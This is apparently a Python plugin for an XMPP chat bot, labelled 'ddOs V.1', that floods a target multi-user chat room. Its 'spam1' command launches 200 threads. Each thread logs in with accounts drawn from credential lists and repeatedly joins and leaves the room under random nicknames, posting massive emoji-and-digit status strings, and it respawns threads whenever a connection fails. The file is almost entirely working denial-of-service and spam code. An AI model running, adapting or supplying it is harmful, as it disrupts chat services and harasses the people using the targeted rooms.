# -*- coding: utf-8 -*-
#############################
###*ddOs V.1|*   ###        *
#############################
## daa@xmpp.ru ##
#################


from xmpp import *
from random import *
from sys import maxint
from pdb import *
import os, xmpp, sys
import threading, types, random
import pdb, urllib
statusx=['56456496564965674656446554326554654965874965406546543165244361544654656496564965476659465045690465894654345664564542365432654532654565465649656476594766594676594676549676549665','!⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦!⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦']

VIPE = {}
ONVIPE = []
GET_NI=[]
GxxN_NI=[]
goto = 0
nemss = NaMe
serv = Serverx
pas = PaSsS	


def jo__slaefr(cl, groupchat):
  nick = 'ddOs.'+str(random.randrange(00, 40))+u''
  GxxN_NI.append(groupchat+'/'+nick)
  prs=xmpp.protocol.Presence(groupchat+'/'+nick)
  prs.setStatus(random.choice(statusx))
  prs.setShow(random.choice(slaefr_show))
  prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
  try:
    cl.send(prs)
  except:
    pass

def lev_slaefr(cl,groupchat,status='BYE'):
  prs=xmpp.Presence(groupchat, 'unavailable')
  try:
    cl.send(prs)
  except:
    pass

def goto45_start(type,source,parameters):
  global goto
  if parameters:
    if not parameters.count('@'):
      reply(type, source, u'This is not a room /:-)')
      return
    body = parameters.split()
    conf = body[0].lower()
    goto = 1
    reply(type,source,u'Ok')
    print u'Ok Started'
    for x in range(0, 200):
      threading.Thread(None, goto34_auth, 'goto34_auth'+str(random.randrange(0, 999)), (type,source,conf)).start()           
		
def goto34_auth(type,source,conf):
  if not goto:
    return
  try:
    bxc = random.choice(nemss)
    pa4ssw = random.choice(pas)
    gserv = random.choice(serv)
    mainRes = 'sdos'+str(random.randrange(00, 30))
    name, domain, password, newBotJid = bxc, gserv, pa4ssw, 0
    node = unicode(name)
    lastnick = name
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    psw = u''
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con = cl.connect()
    au=cl.auth(jid.getNode(), password, jid.getResource())
    cl.sendInitPresence()
    if cl.isConnected():
      threading.Thread(None, j_slaefr_lev, 'j_slaefr_lev'+str(random.randrange(0, 999)), (cl,conf)).start()
      threading.Thread(None, change_Slaefr_nicks, 'change_Slaefr_nicks'+str(random.randrange(0, 999)), (cl,conf)).start()
      threading.Thread(None, change_Slaefr_prs, 'change_Slaefr_prs'+str(random.randrange(0, 999)), (cl,conf)).start()
    else:
      threading.Thread(None, goto34_auth, 'goto34_auth', (type,source,conf)).start()
      return
  except:
    pass



def change_Slaefr_prs(cl, conf):
  prs=xmpp.protocol.Presence()
  prs.setShow(random.choice(slaefr_show))
  prs.setStatus(floood(Slaefr_Status))
  while goto and cl.isConnected():
    jo__slaefr(cl, conf)
    prs.setShow(random.choice(slaefr_show))
    prs.setStatus(floood(Slaefr_Status))
    lev_slaefr(cl,conf)
    jo__slaefr(cl,conf)
    prs.setShow(random.choice(slaefr_show))
    prs.setStatus(floood(Slaefr_Status))
  if goto:
    try:
      threading.Thread(None, goto34_auth, 'goto34_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def change_Slaefr_nicks(cl, conf):
  z=0
  while goto and cl.isConnected():
    jo__slaefr(cl, conf)
    time.sleep(0)
    z+=1
  if goto:
    try:
      threading.Thread(None, goto34_auth, 'goto34_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def j_slaefr_lev(cl, conf):
    jo__slaefr(cl, conf)
    lev_slaefr(cl,conf)

def go_stop(type, source, parameters):
  global goto
  if goto:
    goto = 0
    reply(type,source,u'SToPpeD')
    return
  else:
    reply(type,source,u'NoT AcTiVe')

def lev_slaefr(cl,groupchat,status='BYE'):
  prs=xmpp.Presence(groupchat, 'unavailable')
  try:
    cl.send(prs)
  except:
    pass
    

	
register(goto45_start, Prefix+'spam1', 9)
register(go_stop, Prefix+'stop1', 9)
